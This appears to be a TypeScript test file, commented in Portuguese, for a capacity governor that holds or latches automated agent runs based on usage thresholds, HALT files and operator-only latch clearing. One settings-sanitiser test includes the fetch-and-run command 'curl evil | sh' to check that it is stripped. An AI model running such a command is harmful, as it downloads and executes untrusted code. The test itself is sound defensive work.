import { afterEach, describe, expect, it, vi } from "vitest";
import {
  DAY_MS,
  DEFAULT_GOVERNOR_SETTINGS,
  HOUR_MS,
  MEASURING_RETRY_MS,
  STALE_RETRY_MS,
  admissionFor,
  coerceGovernorSettings,
  coerceLatchFile,
  decideCapacity,
  effectiveLatch,
  governorEnvSwitch,
  initiatorFromOrigin,
  localDayKey,
  mayClearLatch,
  meterStallSince,
  nextLocalDayStart,
  rollBaseline,
  type CapacityInput,
  type CapacityReading,
  type DayBaseline,
} from "./capacity-governor";
import type { GovernorSettings } from "@/lib/storymap/types";

// A TABELA DE DECISÃO do governador de capacidade. Cada caso é uma decisão do dono com número: 80% da semana,
// 90% nas últimas 24h (só com a janela de 5h abaixo de 85%), teto de 5h em 85%, trava em 92% / 90% / uso extra,
// leitura defasada ⇒ espera, sem medidor ⇒ inerte, ritmo diário. As fronteiras são testadas DOS DOIS LADOS —
// um `>=` virando `>` tem de reprovar alguma linha daqui.

const NOW = Date.UTC(2026, 8, 25, 12, 0, 0); // sexta 12:00 UTC
const S: GovernorSettings = { ...DEFAULT_GOVERNOR_SETTINGS, timezone: "UTC" };

function reading(over: Partial<CapacityReading> = {}): CapacityReading {
  return {
    usage7dPct: 40,
    usage5hPct: 20,
    resetsAt7d: NOW + 3 * DAY_MS,
    resetsAt5h: NOW + 2 * HOUR_MS,
    polledAt: NOW - 60_000,
    extraUsageEnabled: false,
    ...over,
  };
}

function input(over: Partial<CapacityInput> = {}): CapacityInput {
  return { now: NOW, settings: S, reading: reading(), meterEverSeen: true, baseline: null, ...over };
}

/** A base do dia tomada à meia-noite e cinco (UTC) do MESMO dia, na mesma janela. */
function baseline(usage7dPct: number, over: Partial<DayBaseline> = {}): DayBaseline {
  const at = Date.UTC(2026, 8, 25, 0, 5);
  return { day: "2026-09-25", usage7dPct, at, resetsAt7d: NOW + 3 * DAY_MS, ...over };
}

afterEach(() => {
  vi.restoreAllMocks();
});

describe("decideCapacity — inércia e medidor", () => {
  it("desligado ⇒ admite INERTE (nada é governado)", () => {
    const v = decideCapacity(input({ settings: { ...S, enabled: false }, reading: reading({ usage7dPct: 99 }) }));
    expect(v).toMatchObject({ kind: "admit", inert: "disabled" });
  });

  it("sem medidor NUNCA visto ⇒ admite INERTE (quem adota sem proxy não trava para sempre)", () => {
    const v = decideCapacity(input({ reading: null, meterEverSeen: false }));
    expect(v).toMatchObject({ kind: "admit", inert: "no-meter" });
  });

  it("primeira leitura em voo ⇒ espera CURTA (measuring), não inerte", () => {
    const v = decideCapacity(input({ reading: null, meterEverSeen: false, meterPending: true }));
    expect(v).toEqual({ kind: "hold", reason: "measuring", detail: expect.any(String), retryAt: NOW + MEASURING_RETRY_MS });
  });

  it("medidor que JÁ EXISTIU e sumiu ⇒ espera (defasado) — fail-closed, não inerte", () => {
    const v = decideCapacity(input({ reading: null, meterEverSeen: true }));
    expect(v).toMatchObject({ kind: "hold", reason: "stale", retryAt: NOW + STALE_RETRY_MS });
  });
});

describe("decideCapacity — leitura defasada", () => {
  it("mais velha que staleMinutes ⇒ espera; exatamente no limite ainda vale", () => {
    const velha = decideCapacity(input({ reading: reading({ polledAt: NOW - 20 * 60_000 - 1 }) }));
    expect(velha).toMatchObject({ kind: "hold", reason: "stale" });
    const noLimite = decideCapacity(input({ reading: reading({ polledAt: NOW - 20 * 60_000 }) }));
    expect(noLimite.kind).toBe("admit");
  });

  it("defasada VENCE a trava: um 99% de ontem não engata nada, só espera o número novo", () => {
    const v = decideCapacity(input({ reading: reading({ usage7dPct: 99, polledAt: NOW - 3 * HOUR_MS }) }));
    expect(v).toMatchObject({ kind: "hold", reason: "stale" });
  });

  it("uma leitura cuja janela semanal já virou é defasada", () => {
    const v = decideCapacity(input({ reading: reading({ resetsAt7d: NOW - 1 }) }));
    expect(v).toMatchObject({ kind: "hold", reason: "stale" });
  });

  it("staleMinutes configurável", () => {
    const v = decideCapacity(input({ settings: { ...S, staleMinutes: 5 }, reading: reading({ polledAt: NOW - 6 * 60_000 }) }));
    expect(v).toMatchObject({ kind: "hold", reason: "stale" });
  });
});

describe("decideCapacity — a trava automática", () => {
  it("uso extra (pago) ligado ⇒ trava, com a janela folgada", () => {
    const v = decideCapacity(input({ reading: reading({ usage7dPct: 5, extraUsageEnabled: true }) }));
    expect(v).toMatchObject({ kind: "latch", reason: "extra-usage" });
  });

  it("7d ≥ 92 ⇒ trava; 91.9 ⇒ não trava (fica no teto semanal)", () => {
    expect(decideCapacity(input({ reading: reading({ usage7dPct: 92 }) }))).toMatchObject({ kind: "latch", reason: "week" });
    expect(decideCapacity(input({ reading: reading({ usage7dPct: 91.9 }) }))).toMatchObject({ kind: "hold", reason: "week-cap" });
  });

  it("5h ≥ 90 ⇒ trava; 89.9 ⇒ só o teto de 5h", () => {
    expect(decideCapacity(input({ reading: reading({ usage5hPct: 90 }) }))).toMatchObject({ kind: "latch", reason: "five-hour" });
    expect(decideCapacity(input({ reading: reading({ usage5hPct: 89.9 }) }))).toMatchObject({ kind: "hold", reason: "five-hour" });
  });
});

describe("decideCapacity — o teto de 5h", () => {
  it("5h ≥ 85 ⇒ espera até o reset da janela curta; 84.9 ⇒ admite", () => {
    const v = decideCapacity(input({ reading: reading({ usage5hPct: 85 }) }));
    expect(v).toMatchObject({ kind: "hold", reason: "five-hour", retryAt: NOW + 2 * HOUR_MS });
    expect(decideCapacity(input({ reading: reading({ usage5hPct: 84.9 }) })).kind).toBe("admit");
  });

  it("sem reset conhecido da janela curta, re-tenta em meia hora", () => {
    const v = decideCapacity(input({ reading: reading({ usage5hPct: 86, resetsAt5h: null }) }));
    expect(v).toMatchObject({ kind: "hold", reason: "five-hour", retryAt: NOW + 30 * 60_000 });
  });

  it("5h desconhecida (medidor sem a janela curta) não bloqueia", () => {
    expect(decideCapacity(input({ reading: reading({ usage5hPct: null }) })).kind).toBe("admit");
  });
});

describe("decideCapacity — o teto semanal e as últimas 24h", () => {
  it("7d = 80 com 3 dias pela frente ⇒ espera a ABERTURA das últimas 24h (quando o teto sobe)", () => {
    const v = decideCapacity(input({ reading: reading({ usage7dPct: 80 }) }));
    expect(v).toMatchObject({ kind: "hold", reason: "week-cap", retryAt: NOW + 3 * DAY_MS - DAY_MS });
  });

  it("7d = 79.9 com a base do dia igual ⇒ admite (ainda cabe)", () => {
    const v = decideCapacity(input({ reading: reading({ usage7dPct: 79.9 }), baseline: baseline(79.9) }));
    expect(v.kind).toBe("admit");
  });

  it("últimas 24h com 5h folgada: o teto vira 90 — 85 admite, 90 espera o RESET", () => {
    const r = { resetsAt7d: NOW + 20 * HOUR_MS, usage5hPct: 50 };
    const b = baseline(85, { resetsAt7d: NOW + 20 * HOUR_MS });
    const ok = decideCapacity(input({ reading: reading({ ...r, usage7dPct: 85 }), baseline: b }));
    expect(ok.kind).toBe("admit");
    expect(ok.kind === "admit" && ok.pacing?.ceilingPct).toBe(90);
    const cheio = decideCapacity(input({ reading: reading({ ...r, usage7dPct: 90 }), baseline: b }));
    expect(cheio).toMatchObject({ kind: "hold", reason: "week-cap", retryAt: NOW + 20 * HOUR_MS });
  });

  it("últimas 24h com a 5h NO TETO: o 90 não abre — o automático espera a janela curta", () => {
    const v = decideCapacity(input({ reading: reading({ resetsAt7d: NOW + 20 * HOUR_MS, usage7dPct: 82, usage5hPct: 85 }) }));
    expect(v).toMatchObject({ kind: "hold", reason: "five-hour" });
    expect(v.kind === "hold" && v.pacing?.ceilingPct).toBe(80);
  });

  it("exatamente 24h antes do reset já é 'últimas 24h'", () => {
    const v = decideCapacity(input({ reading: reading({ resetsAt7d: NOW + DAY_MS, usage7dPct: 85 }), baseline: baseline(85, { resetsAt7d: NOW + DAY_MS }) }));
    expect(v.kind).toBe("admit");
  });
});

describe("decideCapacity — o ritmo diário", () => {
  // Base 40 à 00:05, reset 3d+12h depois da base ⇒ (80 − 40) ÷ ~3.5 ≈ 11.4 pp para hoje.
  const b = baseline(40);
  const cota = (80 - 40) / ((b.resetsAt7d - b.at) / DAY_MS);

  it("abaixo da cota ⇒ admite; NA cota ⇒ espera a virada do dia local", () => {
    expect(decideCapacity(input({ reading: reading({ usage7dPct: 40 + cota - 0.1 }), baseline: b })).kind).toBe("admit");
    const v = decideCapacity(input({ reading: reading({ usage7dPct: 40 + cota }), baseline: b }));
    expect(v).toMatchObject({ kind: "hold", reason: "daily-allowance", retryAt: Date.UTC(2026, 8, 26, 0, 0) });
    expect(v.kind === "hold" && v.pacing?.allowancePct).toBeCloseTo(cota, 5);
  });

  it("o gasto conta o uso TOTAL (dono + frota): a subida da janela desde a 1ª leitura do dia", () => {
    const v = decideCapacity(input({ reading: reading({ usage7dPct: 55 }), baseline: b }));
    expect(v).toMatchObject({ kind: "hold", reason: "daily-allowance" });
    expect(v.kind === "hold" && v.pacing?.usedTodayPct).toBe(15);
  });

  it("base de OUTRO dia ⇒ esta leitura é a primeira de hoje (gasto 0, admite)", () => {
    const ontem = baseline(20, { day: "2026-09-24", at: Date.UTC(2026, 8, 24, 0, 5) });
    const v = decideCapacity(input({ reading: reading({ usage7dPct: 60 }), baseline: ontem }));
    expect(v.kind).toBe("admit");
    expect(v.kind === "admit" && v.pacing?.baselinePct).toBe(60);
  });

  it("base de OUTRA janela semanal (o reset aconteceu hoje) ⇒ base nova", () => {
    const janelaVelha = baseline(78, { resetsAt7d: NOW - 2 * HOUR_MS });
    const v = decideCapacity(input({ reading: reading({ usage7dPct: 3 }), baseline: janelaVelha }));
    expect(v.kind).toBe("admit");
    expect(v.kind === "admit" && v.pacing?.baselinePct).toBe(3);
  });

  it("no último dia a cota é TODO o espaço até o teto (divide por no mínimo 1 dia)", () => {
    const r = NOW + 10 * HOUR_MS;
    const bUltimo = baseline(60, { resetsAt7d: r, at: NOW - 2 * HOUR_MS });
    const v = decideCapacity(input({ reading: reading({ usage7dPct: 60, resetsAt7d: r, usage5hPct: 10 }), baseline: bUltimo }));
    expect(v.kind === "admit" && v.pacing?.allowancePct).toBe(30); // (90 − 60) ÷ 1
  });

  it("re-tenta no PRIMEIRO de: virada do dia, abertura das últimas 24h, reset", () => {
    // reset em 30h ⇒ as últimas 24h abrem em 6h, antes da meia-noite (12h).
    const r = NOW + 30 * HOUR_MS;
    const bb = baseline(40, { resetsAt7d: r });
    const v = decideCapacity(input({ reading: reading({ usage7dPct: 79, resetsAt7d: r }), baseline: bb }));
    expect(v).toMatchObject({ kind: "hold", reason: "daily-allowance", retryAt: NOW + 6 * HOUR_MS });
  });
});

describe("rollBaseline", () => {
  it("mantém a base do mesmo dia e janela; troca de dia ou de janela troca a base", () => {
    const b = baseline(40);
    expect(rollBaseline(b, reading({ usage7dPct: 50 }), NOW, "UTC")).toBe(b);
    // o resets_at do proxy oscila em segundos entre polls: ainda é a MESMA janela
    expect(rollBaseline(b, reading({ usage7dPct: 50, resetsAt7d: b.resetsAt7d + 1_000 }), NOW, "UTC")).toBe(b);
    // uma leitura ABAIXO da base re-ancora para baixo (mesmo dia, mesma janela, mesmo `at`)
    expect(rollBaseline(b, reading({ usage7dPct: 35 }), NOW, "UTC")).toEqual({ ...b, usage7dPct: 35 });
    const amanha = NOW + DAY_MS;
    expect(rollBaseline(b, reading({ usage7dPct: 50 }), amanha, "UTC")).toMatchObject({ day: "2026-09-26", usage7dPct: 50, at: amanha });
  });
});

describe("o dia LOCAL (fuso configurável)", () => {
  it("o mesmo instante é dias diferentes em fusos diferentes", () => {
    const t = Date.UTC(2026, 8, 25, 2, 0); // 23:00 do dia 24 em São Paulo (UTC−3)
    expect(localDayKey(t, "UTC")).toBe("2026-09-25");
    expect(localDayKey(t, "America/Sao_Paulo")).toBe("2026-09-24");
    expect(nextLocalDayStart(t, "America/Sao_Paulo")).toBe(Date.UTC(2026, 8, 25, 3, 0));
  });

  it("dia de 25h (fim do horário de verão europeu): a próxima meia-noite é a CERTA", () => {
    // 2026-10-25 00:30Z = 02:30 CEST, antes de o relógio voltar às 03:00 CEST ⇒ a meia-noite é 23:00Z (CET).
    expect(nextLocalDayStart(Date.UTC(2026, 9, 25, 0, 30), "Europe/Berlin")).toBe(Date.UTC(2026, 9, 25, 23, 0));
  });

  it("dia de 23h (início do horário de verão europeu)", () => {
    // 2026-03-29 00:30Z = 01:30 CET; às 02:00 o relógio pula para 03:00 CEST ⇒ meia-noite é 22:00Z.
    expect(nextLocalDayStart(Date.UTC(2026, 2, 29, 0, 30), "Europe/Berlin")).toBe(Date.UTC(2026, 2, 29, 22, 0));
  });
});

describe("initiatorFromOrigin — quem iniciou", () => {
  it("só `manual` fora de um ator escopado é operador; o resto é automação", () => {
    expect(initiatorFromOrigin("manual", false)).toBe("operator");
    expect(initiatorFromOrigin("manual", true)).toBe("automation"); // o copiloto pelo token escopado
    expect(initiatorFromOrigin("autorun", false)).toBe("automation");
    expect(initiatorFromOrigin("conflict-redrive", false)).toBe("automation");
    expect(initiatorFromOrigin(undefined, false)).toBe("automation"); // o default do engine é autorun
  });
});

describe("admissionFor — o operador nunca espera", () => {
  const hold = decideCapacity(input({ reading: reading({ usage7dPct: 85 }) }));
  const trava = decideCapacity(input({ reading: reading({ usage7dPct: 95 }) }));
  const halt = effectiveLatch(null, { path: "/etc/agileharness/HALT", at: NOW });

  it("operador passa por espera, trava automática e HALT", () => {
    for (const [v, l] of [[hold, null], [trava, null], [hold, halt]] as const) {
      expect(admissionFor("operator", v, l)).toMatchObject({ admit: true, reason: "operator" });
    }
  });

  it("automação: HALT/trava ⇒ espera sem prazo; hold ⇒ espera com prazo; inerte ⇒ passa", () => {
    expect(admissionFor("automation", decideCapacity(input()), halt)).toMatchObject({ admit: false, reason: "latch", retryAt: null });
    expect(admissionFor("automation", trava, null)).toMatchObject({ admit: false, reason: "auto-latch", retryAt: null });
    expect(admissionFor("automation", hold, null)).toMatchObject({ admit: false, reason: "week-cap", retryAt: NOW + 2 * DAY_MS });
    const inerte = decideCapacity(input({ reading: null, meterEverSeen: false }));
    expect(admissionFor("automation", inerte, null)).toMatchObject({ admit: true, reason: "inert" });
    expect(admissionFor("automation", decideCapacity(input()), null)).toMatchObject({ admit: true, reason: "admit" });
  });
});

describe("a trava — arquivo, HALT e quem solta", () => {
  it("latch.json ausente ⇒ sem trava; malformado ⇒ trava DURA (fail-closed); válido ⇒ o que diz", () => {
    expect(coerceLatchFile(undefined, false, NOW)).toBeNull();
    expect(coerceLatchFile("lixo", true, NOW)).toMatchObject({ level: "hard" });
    expect(coerceLatchFile({ level: "gigante", reason: "x" }, true, NOW)).toMatchObject({ level: "hard" });
    expect(coerceLatchFile({ level: "soft", reason: "7d 93%", at: 5, trippedBy: "auto:week" }, true, NOW)).toEqual({
      level: "soft",
      reason: "7d 93%",
      at: 5,
      trippedBy: "auto:week",
    });
  });

  it("HALT do host vence o arquivo e é sempre `hard`", () => {
    const f = { level: "soft" as const, reason: "x", at: 1, trippedBy: "operator" };
    expect(effectiveLatch(f, { path: "/h", at: 9 })).toMatchObject({ level: "hard", source: "halt", at: 9 });
    expect(effectiveLatch(f, null)).toMatchObject({ level: "soft", source: "file" });
    expect(effectiveLatch(null, null)).toBeNull();
  });

  it("só o operador COM SESSÃO e com motivo solta a trava — nunca um token MCP, nem o próprio serviço", () => {
    expect(mayClearLatch("operator-session", "semana nova, liberar")).toEqual({ ok: true });
    expect(mayClearLatch("mcp-token", "liberar")).toMatchObject({ ok: false });
    expect(mayClearLatch("in-process", "liberar")).toMatchObject({ ok: false });
    expect(mayClearLatch("operator-session", "  ")).toMatchObject({ ok: false });
  });
});

describe("coerceGovernorSettings — fail-closed por campo, sem spread", () => {
  it("ausente ⇒ os defaults do dono", () => {
    expect(coerceGovernorSettings(undefined)).toEqual({ ...DEFAULT_GOVERNOR_SETTINGS });
  });

  it("valores válidos entram; chave desconhecida NÃO atravessa", () => {
    const c = coerceGovernorSettings({ weekCapPct: 70, weekCapLast24hPct: 88, staleMinutes: "15", timezone: "America/Sao_Paulo", extra: 1 });
    expect(c).toMatchObject({ weekCapPct: 70, weekCapLast24hPct: 88, staleMinutes: 15, timezone: "America/Sao_Paulo" });
    expect(c).not.toHaveProperty("extra");
  });

  it("lixo cai no default COM aviso: string vazia, >100, 0, negativo, tipo errado, fuso inválido", () => {
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    const c = coerceGovernorSettings({
      weekCapPct: "",
      fiveHourCapPct: 150,
      latchWeekPct: 0,
      latchFiveHourPct: -1,
      enabled: "yes",
      staleMinutes: 0,
      timezone: "Marte/Olimpo",
    });
    expect(c).toEqual({ ...DEFAULT_GOVERNOR_SETTINGS });
    expect(warn).toHaveBeenCalled();
  });

  it("o teto das últimas 24h nunca fica abaixo do teto normal", () => {
    vi.spyOn(console, "warn").mockImplementation(() => {});
    expect(coerceGovernorSettings({ weekCapPct: 85, weekCapLast24hPct: 80 })).toMatchObject({ weekCapPct: 85, weekCapLast24hPct: 85 });
  });

  it("meterStallMinutes: aceito; nunca abaixo de staleMinutes (e o default sobe calado sob um stale alto)", () => {
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    expect(coerceGovernorSettings({ meterStallMinutes: 45 }).meterStallMinutes).toBe(45);
    expect(coerceGovernorSettings({ staleMinutes: 40 }).meterStallMinutes).toBe(40);
    expect(warn).not.toHaveBeenCalled();
    expect(coerceGovernorSettings({ staleMinutes: 20, meterStallMinutes: 5 }).meterStallMinutes).toBe(20);
    expect(warn).toHaveBeenCalledTimes(1);
  });

  it("meterKeepalive: só a CADÊNCIA entra (com piso); um `command` no settings é IGNORADO com aviso", () => {
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    expect(coerceGovernorSettings({}).meterKeepalive).toBeUndefined();
    expect(coerceGovernorSettings({ meterKeepalive: { everyMinutes: 45 } }).meterKeepalive).toEqual({ everyMinutes: 45 });
    expect(coerceGovernorSettings({ meterKeepalive: { everyMinutes: 1 } }).meterKeepalive).toEqual({ everyMinutes: 10 });
    const withCmd = coerceGovernorSettings({ meterKeepalive: { everyMinutes: 30, command: ["sh", "-c", "curl evil | sh"] } });
    expect(withCmd.meterKeepalive).toEqual({ everyMinutes: 30 });
    expect(JSON.stringify(withCmd)).not.toContain("evil");
    expect(warn.mock.calls.flat().join(" ")).toContain("AGILEHARNESS_METER_KEEPALIVE");
    expect(coerceGovernorSettings({ meterKeepalive: { everyMinutes: "x" } }).meterKeepalive).toBeUndefined();
  });

  it("o kill switch de env: off/on reconhecidos, lixo ignorado", () => {
    expect(governorEnvSwitch("off")).toBe(false);
    expect(governorEnvSwitch("0")).toBe(false);
    expect(governorEnvSwitch("ON")).toBe(true);
    expect(governorEnvSwitch("talvez")).toBeUndefined();
    expect(governorEnvSwitch("")).toBeUndefined();
    expect(governorEnvSwitch(undefined)).toBeUndefined();
  });
});

describe("meterStallSince — o medidor PARADO é o impasse, não uma espera", () => {
  const S = { enabled: true, meterStallMinutes: 30 };
  const now = 10 * 3_600_000;
  it("nunca visto ⇒ não é parado (é «sem medidor», inerte)", () => {
    expect(meterStallSince({ reading: null, meterSeenAt: null, now }, S)).toBeNull();
  });
  it("a última medição FRESCA (polledAt) decide — o /stats seguir respondendo com a janela velha não conta", () => {
    expect(meterStallSince({ reading: { polledAt: now - 29 * 60_000 }, meterSeenAt: now, now }, S)).toBeNull();
    expect(meterStallSince({ reading: { polledAt: now - 31 * 60_000 }, meterSeenAt: now, now }, S)).toBe(now - 31 * 60_000);
  });
  it("sem leitura nenhuma, conta desde a última vez que o medidor foi visto; desligado ⇒ nunca", () => {
    expect(meterStallSince({ reading: null, meterSeenAt: now - 60 * 60_000, now }, S)).toBe(now - 60 * 60_000);
    expect(meterStallSince({ reading: null, meterSeenAt: now - 60 * 60_000, now }, { ...S, enabled: false })).toBeNull();
  });
});
